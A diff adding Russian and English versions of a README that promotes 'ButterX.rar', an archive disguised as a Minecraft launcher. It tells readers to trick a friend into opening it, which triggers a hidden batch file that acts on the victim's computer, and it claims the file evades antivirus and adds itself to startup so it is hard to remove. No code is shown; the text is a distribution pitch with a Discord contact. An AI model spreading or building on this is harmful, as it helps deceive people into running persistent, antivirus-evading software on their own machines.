@@ -1,3 +1,4 @@
+РУССКИЙ ПЕРЕВОД:
 Скачайте архив ButterX сверху, этого достаточно!
 
 Это мой архив ButterX.rar внутри находится типо лаунчер майнкрафт, но это не так!
@@ -11,3 +12,18 @@
 
 Продажа и прочие махинации запрещены, файл открыт для общего доступа.
 Если хотите поддержать меня, напишите так же в дискорд: sergey0066
+............................................................................................=
+ENGLISH TRANSLATION:
+Download the ButterX archive from above, that's enough!
+
+This is my archive ButterX.rar there is a minecraft launcher inside, but it's not like that!
+Move the ButterX folder inside the file to your desktop and ask your friend to open it.
+Your friend will try to run Start.bat, but he will fail, he will give an error.
+Then ask him to click on the "Instructions", after that his computer will have fun))
+There is a hidden batnik inside, which will open when you click on the "Instructions", all actions that will take place on his screen, I am not responsible for this!
+The priority of my file is that the antivirus will think that it is necessary, so it will allow the launch of my type of launcher without any problems! 
+The file is also added to the startup, thus it will be difficult to save your friend.
+I will tell you more about the work in discord: sergey0066
+
+Sales and other frauds are prohibited, the file is open for public access.
+If you want to support me, write to discord as well: sergey0066
